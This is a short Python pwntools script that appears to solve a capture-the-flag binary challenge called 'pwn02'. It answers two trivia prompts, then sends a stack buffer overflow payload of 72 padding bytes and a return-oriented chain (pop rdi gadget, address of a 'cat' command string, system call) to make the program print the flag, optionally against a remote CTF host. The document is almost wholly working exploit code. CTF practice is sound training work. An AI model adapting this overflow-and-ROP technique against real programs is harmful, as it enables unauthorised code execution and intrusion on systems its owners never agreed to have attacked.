#!/usr/bin/env python3

from pwn import *

context.binary = elf = ELF('./src/pwn02')
context.arch = 'amd64'
context.endian = 'little'
context.log_level = 'error'

if args.REMOTE:
    io = remote("pwn02.ctf.teamquark.com", 65302)
else:
    io = elf.process()

io.recvuntil(b"?\n")
io.sendline(b'elliot') # Send first answer

io.recvuntil(b"?\n")
io.sendline(b'Darlene Alderson') # Send second answer

io.recvuntil(b"?\n") # Jump to the vulnerable input

offset = 72
cat_cmd = 0x402069
pop_rdi = 0x40146b
system_call = 0x4011cf

payload = b''.join([
    b'A'*offset,
    pack(pop_rdi),
    pack(cat_cmd),
    pack(system_call)
])

io.sendline(payload) # Run the payload
flag = io.recvline().decode().strip()
print("[+] Flag :", flag)
io.close()